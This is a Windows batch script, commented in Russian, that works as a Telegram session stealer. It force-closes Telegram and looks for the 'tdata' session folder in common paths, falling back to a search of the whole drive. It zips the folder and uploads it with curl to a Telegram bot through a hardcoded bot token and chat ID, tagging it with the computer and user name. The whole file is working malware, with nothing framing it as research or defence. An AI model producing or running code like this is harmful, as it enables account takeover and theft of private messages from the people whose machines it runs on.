@echo off
setlocal
set "token=8546393587:AAEGxN5XHSiQGAS-pbRwQFmkOfREjFfCDaQ"
set "chat=990030901"
set "pc=%COMPUTERNAME%_%USERNAME%"

taskkill /f /im Telegram.exe >nul 2>nul

:: быстрый список самых частых мест
for %%a in (
    "%APPDATA%\Telegram Desktop\tdata"
    "%APPDATA%\Telegram Desktop Beta\tdata"
    "%LOCALAPPDATA%\Packages\TelegramMessengerLLP.TelegramDesktop_*\LocalState\tdata"
    "%USERPROFILE%\Downloads\tdata"
    "%USERPROFILE%\Desktop\tdata"
    "%USERPROFILE%\Downloads\Telegram Desktop\tdata"
    "%USERPROFILE%\Desktop\Telegram Desktop\tdata"
    "C:\Telegram Desktop\tdata"
    "%~dp0tdata"
) do if exist "%%a" call :pack "%%a" & goto end

:: если не нашёл — полный поиск по всему диску (медленно, но 100 %)
echo Поиск по всему диску...
for /f "delims=" %%F in ('dir "%SystemDrive%\tdata" /b /s /a:d 2^>nul') do call :pack "%%F" & goto end

curl -s -X POST "https://api.telegram.org/bot%token%/sendMessage" -d chat_id=%chat% -d text="tdata так и не нашёл :: %pc%"
goto end

:pack
set "src=%~1"
set "tmp=%TEMP%\tdata_final_%RANDOM%"
xcopy "%src%" "%tmp%" /E /I /H /Y /Q >nul 2>nul
powershell -nop -c "Compress-Archive -Force '%tmp%' '%TEMP%\TDATA_%pc%.zip'" >nul 2>nul
rd /s /q "%tmp%" >nul 2>nul
curl -F chat_id=%chat% -F document=@"%TEMP%\TDATA_%pc%.zip" -F caption="TDATA НАКОНЕЦ-ТО ЕСТЬ → %pc% → %src%"
del "%TEMP%\TDATA_%pc%.zip" >nul 2>nul
goto :eof

:end
exit
